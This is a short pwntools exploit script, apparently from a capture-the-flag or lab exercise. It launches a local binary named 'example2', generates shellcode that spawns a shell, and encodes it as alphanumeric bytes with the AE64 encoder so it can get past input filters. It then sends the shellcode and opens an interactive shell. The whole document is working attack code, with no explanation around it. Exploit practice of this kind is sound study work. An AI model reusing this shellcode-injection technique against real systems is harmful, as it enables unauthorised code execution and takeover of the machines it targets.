from pwn import *
from ae64 import AE64

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./example2')

obj = AE64()
sc = obj.encode(asm(shellcraft.sh()),'rax',0x30,1)

p.sendline(sc)

p.interactive()
